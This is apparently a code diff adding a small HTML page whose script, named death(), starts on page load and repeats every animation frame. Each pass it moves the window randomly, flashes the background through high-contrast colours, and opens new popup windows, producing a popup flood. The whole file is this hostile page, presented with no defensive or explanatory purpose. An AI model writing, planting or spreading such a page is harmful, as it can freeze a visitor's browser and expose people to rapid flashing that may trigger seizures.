@@ -1,0 +1,32 @@
+<script>
+	const winWidth = rand(100) + 100;
+	const winHeight = rand(100) + 100;
+
+	function rand(max) {
+		return Math.floor(Math.random() * (max + 1));
+	}
+	function randChoiceExclusion(arr, exclude) {
+		var arr2 = arr.filter(e => e !== exclude);
+		return arr2[rand(arr2.length - 1)];
+	}
+	function death() {
+		const currentWinWidth  = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
+		const currentWinHeight = window.innerHeight|| document.documentElement.clientHeight || document.body.clientHeight;
+
+ 		window.moveTo(rand(screen.width - currentWinWidth), rand(screen.height - currentWinHeight));
+ 		document.body.style.background = randChoiceExclusion([
+ 			'white',
+ 			'red',
+			'lime',
+			'blue',
+			'black'
+ 		], document.body.style.background);
+
+ 		const timestamp = Date.now().toString();
+		if (!window.location.search.includes('child')) {
+			window.open(window.location.href.split('?')[0] + '?child=', timestamp, `width=${winWidth},height=${winHeight}`);
+		}
+		requestAnimationFrame(death);
+	}
+</script>
+<body onload="death()"></body>
